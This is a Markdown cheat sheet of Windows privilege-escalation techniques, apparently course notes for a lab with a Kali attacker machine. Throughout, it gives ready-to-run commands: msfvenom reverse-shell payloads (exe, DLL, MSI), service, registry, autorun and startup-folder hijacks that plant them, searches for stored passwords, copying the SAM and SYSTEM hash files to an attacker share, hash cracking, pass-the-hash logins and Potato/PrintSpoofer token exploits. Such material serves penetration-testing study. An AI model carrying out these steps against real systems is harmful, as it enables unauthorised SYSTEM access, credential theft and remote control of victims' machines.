# Windows Privilege Escalation
* [General tips](#General-tips)
* [Tools](#Tools)
* [Manual Enumeration](#Manual-Enumeration)
* [Privilege escalation techniques](#Privilege-escalation-techniques)
  * [Kernel exploits](#Kernel-exploits)
  * [Service Exploits](#Service-Exploits)
    * [Insecure Service Properties](#Insecure-Service-Properties)
    * [Unqouted Service Path](#Unqouted-Service-Path)
    * [Weak registry permissions](#Weak-registry-permissions)
    * [Insecure Service Executables](#Insecure-Service-Executables)
    * [DLL Hijacking](#DLL-Hijacking)
  * [Registery](#Registery)
  * [Passwords](#Passwords)
  * [Scheduled tasks](#Scheduled-tasks)
  * [Insecure GUI Apps](#Insecure-GUI-Apps)
  * [Startup apps](#Startup-apps)
  * [Installed applications](#Installed-applications)
  * [Hot potato](#Hot-potato)
  * [Token impersonation](#Token-impersonation)

## General tips
- https://lolbas-project.github.io/
- Windows check if Windows Scheduler is running (```tasklist```)
  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
  - Check if we got write permissions
- Administrative command execution tips
  - Use msfvenom for shells if we can execute something with admin privileges
     - ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
     - ```msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
  - RDP
     - ```net localgroup administrators <username> /add```
  - Admin --> System
    - ```.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe```
    - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

## Tools
#### Powerup & SharpUp
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://github.com/GhostPack/SharpUp

```
powershell.exe
. ./PowerUp.ps1
Invoke-Allchecks
```

```
.\SharpUp.exe
```

#### Seatbelt
https://github.com/GhostPack/Seatbelt

```
./seatbelt.exe all
```

#### winPEAS
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
.\winPEASany.exe quiet cmd fast
.\winPEASany.exe
```

#### accesschk.exe
AccessChk is an old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys. The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

#### Always do first:
```
accesschk.exe /accepteula
```

## Manual Enumeration
#### Check the current user
```
whoami
```

#### Check all the users
```
net user
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
systeminfo
```

#### Check Running processes
```
tasklist /svc
```

#### Check running services
```
wmic service get name,displayname,pathname,startmode
```

#### Check permission on file
```
icalcs "<PATH>"
```

#### Check current privileges
```
whoami /priv & whoami /groups
```
if SeImpersonatePrivilege is set (https://github.com/itm4n/PrintSpoofer or juicypotato)

#### Check networking information
```
ipconfig /all
route print
```

#### Check open ports
```
netstat -ano
```

#### Enumerate firewall
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

#### Enumerate scheduled task
```
schtasks /query /fo LIST /v
```

#### Installed applications and patch levels
```
wmic product get name, version, vendor
```

#### Readable/writable files and directories
```
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

#### Device drivers and kernel modules
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*<DRIVER>*"}
```

#### Binaries that auto elevate
Check status of AlwaysInstalledElevated registery setting (if yes then craft a MSI)
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

#### Check the architecture
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

#### Check for drivers
```
driverquery /v
```

#### Check the driver files for version etc and check if it’s vulnerable
```
cd C:\Program Files\<DRIVER>
```

## Privilege escalation techniques
Run winPEAS and if it find something fuzzy use these techniques to exploit it.

## Kernel exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user.

1. Enumerate Windows version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, Github)
3. Compile and run

#### Finding kernel exploits
- https://github.com/bitsadmin/wesng
- https://github.com/rasta-mouse/Watson
- Pre compiled Kernel exploits
  - https://github.com/SecWiki/windows-kernel-exploits
  
#### Get systeminfo
```
systeminfo > systeminfo.txt
```

#### Run on kali
```
python wes.py systeminfo.txt -i 'Elevation of privilege' --exploits-only
```

#### Cross-reference results with compiled exploits + run them
https://github.com/SecWiki/windows-kernel-exploits

## Service Exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

#### Check services access
```
accesschk.exe /accepteula -uwcqv <USER> * > ack.txt
type ack.txt
```

#### Query the configuration of a service:
```
sc.exe qc <SERVICE NAME>
```

#### Query the current status of a service:
```
sc.exe query <SERVICE NAME>
```

#### Modify a configuration option of a service:
```
sc.exe config <NAME> <OPTION>= <VALUE>
```

#### Start/Stop a service:
```
net start/stop <SERVICE NAME>
```

### Insecure Service Properties
Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS). Some may be useful (e.g. SERVICE_STOP, SERVICE_START). Some are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS).

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

#### Confirm with accesschk.exe
```
.\accesschk.exe /accepteula -uwcqv <USER> <SERVICE NAME>
```

#### Check the current configuration of the service:
```
sc qc daclsvc
```

#### Check current status of the service
```
sc query daclsvc
```

#### Reconfigure the service to use our reverse shell executable:
```
sc config daclsvc binpath= "\"C:\temp\reverse.exe\""
```

#### Change the start + object
```
sc config daclsvc obj= ".\LocalSystem" password= ""
sc config daclsvc start= "demand"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net start daclsvc
```

### Unqouted Service Path
Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”). Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3… This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: ```C:\Program Files\Some Dir\SomeProgram.exe``` To us, this obviously runs ```SomeProgram.exe```. To Windows, ```C:\Program``` could be the executable, with two arguments: ```Files\Some``` and ```Dir\ SomeProgram.exe``` Windows resolves this ambiguity by checking each of the possibilities in turn. If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

#### Confirm this using sc:
```
sc qc <SERVICE NAME>
```

#### Use accesschk.exe to check for write permissions:
```
.\accesschk.exe /accepteula -uwdq "<PATH WITH SPACE>"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### Copy the reverse shell executable and rename it appropriately:
```
copy C:\temp\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Weak registry permissions
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

#### We can confirm a weak registery entry with:
a. Powershell
   - ```Get-Acl <REG PATH> | Format-List```
B. accesschk.exe
   - ```.\accesschk.exe /accepteula -uvwqk <REG PATH>```

#### Overwrite the <VALUE> of registry key to point to our reverse shell executable:
```
reg add <REG PATH> /v <REG VALUE> /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Insecure Service Executables
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!

#### Check if executable is writable
```
.\accesschk.exe /accepteula -quvw "<PATH TO EXE>"
```

#### Create a backup of the original service executable:
```
copy "<PATH>" C:\Temp
```

#### Copy the reverse shell executable to overwrite the service executable:
```
copy /Y C:\PrivEsc\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### DLL Hijacking
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual 

#### Check for a writable directory that is in path
Start by enumerating which of these services our user has stop and start access to:
```
.\accesschk.exe /accepteula -uvqc <USER> <SERVICE>
```

#### Confirm output of winpeas if DLL is vulnerable
```
sc qc <SERVICE>
```

1. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
2. Add a new filter on the Process Name matching NAME.exe.
3. On the main screen, deselect registry activity and network activity.
4. Start the service:
5. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the .dll file.
6. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

#### On Kali, generate a reverse shell DLL named hijackme.dll:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
```

#### Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

## Registery
### Autoruns
Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

#### Enumerate autorun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Check executables manually
```
.\accesschk.exe /accepteula -wvu "<PATH TO EXE>"
```

#### If an autorun executable is found, make a copy
```
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

#### Copy reverse shell to overwrite the autorun executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

#### Start a listener on Kali, and then restart the Windows VM to trigger the exploit.
Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

### AlwaysInstallElevated
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work.

#### Manually check
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Mi
```

#### Create a reverse shell with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
```

#### Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
```
msiexec /quiet /qn /i C:\temp\reverse.msi
```

## Passwords
Yes, passwords. Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

### Registery
Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords. The following commands will search the registry for keys and values that contain “password”

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Spawn shell using credentials
```
winexe -U '<USERNAME>%<PASSWORD>' //<IP> cmd.exe
```

### Saved creds
Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

#### Manually check for saved credentials
```
cmdkey /list
```

#### Use saved credentials
```
runas /savecred /user:admin C:\temp\reverse.exe
```

### Configuration Files
```
Some administrators will leave configurations files on the system with passwords in them. The Unattend.xml file is an example of this. It allows for the largely automated setup of Windows systems.
```

#### Manually search
```
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### SAM
Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes. Located in: ```C:\Windows\System32\config directory.``` or ```C:\Windows\Repair``` or  ```C:\Windows\System32\config\RegBack directories```

#### Copy them to kali
```
copy C:\Windows\Repair\SAM \\<IP>\<SHARE>\
copy C:\Windows\Repair\SYSTEM \\<IP>\<SHARE>\
```

#### Run creddump pdump.py
- https://github.com/Neohapsis/creddump7.git
- /usr/share/creddump7/pwdump.py

```
python2 creddump7/pwdump.py SYSTEM SAM
```

#### Crack with hashcat
```
hashcat -a 0 -m 1000 --force <HASHES> <WORDLIST>
```

#### Pass the hash login
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
```

## Scheduled tasks
Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

#### List all scheduled tasks
```
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## Insecure GUI Apps
On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

#### If you cna open a file with this app go to the explorer and fill in
```
file://c:/windows/system32/cmd.exe
```

## Startup apps
Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file.

#### Use accesschk.exe to check permissions on the StartUp directory:
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

#### Create a file CreateShortcut.vbs with the VBScript provided. Change file paths if necessary.
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

#### Run the script using cscript
```
cscript CreateShortcut.vbs
```

#### Start listener if admin logs == shell

## Installed applications
Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

#### Manually enumerate all running programs:
```
tasklist /v
```

#### Use seatbelt or winPEAS to enumerate nonstandard processes
```
.\seatbelt.exe NonstandardProcesses
.\winPEASany.exe quiet procesinfo
```

## Hot potato
Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
3. Run the exploit: ```.\potato.exe -ip <IP> -cmd "C:\temp\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true```
4. Wait for a Windows Defender update, or trigger one manually.

## Token impersonation
### Service accounts
We briefly talked about service accounts at the start of the course. Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly. Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

### Rotten potato
The original Rotten Potato exploit was identified in 2016. Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. This was possible because service accounts usually have the “SeImpersonatePrivilege” privilege enabled.

#### SeImpersonate / SeAssignPrimaryToken
Service accounts are generally configured with these two privileges. They allow the account to impersonate the access tokens of other users (including the SYSTEM user). Any user with these privileges can run the token impersonation exploits in this lecture.

### Juicy potato
- https://github.com/ohpe/juicy-potato
Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.

#### Run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob
```
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

### Rogue potato
- https://github.com/antonioCoco/RoguePotato
- https://github.com/antonioCoco/RoguePotato/releases

#### use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
```
C:\temp\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\temp\reverse.exe
```

#### Now run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges 
```
C:\PrivEsc\RoguePotato.exe -r <IP> –l <PORT> -e "C:\temp\reverse.exe"
```

### Printspoofer
PrintSpoofer is an exploit that targets the Print Spooler service.
- https://github.com/itm4n/PrintSpoofer

#### Run printspoofer exploit
```
C:\PrivEsc\PrintSpoofer.exe -i -c "C:\temp\reverse.exe"
C:\PrintSpoofer.exe -i -c cmd.exe
```

### User privileges
- https://github.com/hatRiot/token-priv
In Windows, user accounts and groups can be assigned specific “privileges”. These privileges grant access to certain abilities. Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.

#### Check privileges
Note that “disabled” in the state column is irrelevant here. If the privilege is listed, your user has it.
```
whoami /priv
```

- SeImpersonatePrivilege
  - The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain. If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token. The Juicy Potato exploit in a previous section abuses this ability.
- SeAssignPrimaryPrivilege
  - The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege. It enables a user to assign an access token to a new process. Again, this can be exploited with the Juicy Potato exploit.
- SeBackupPrivilege
  -  The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL. Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
- seRestorePrivilege
  - The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege: Modify service binaries, Overwrite DLLS used by SYSTEM processes, Modify registery settings
- SeTakeOwnershipPrivilege
  - The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.
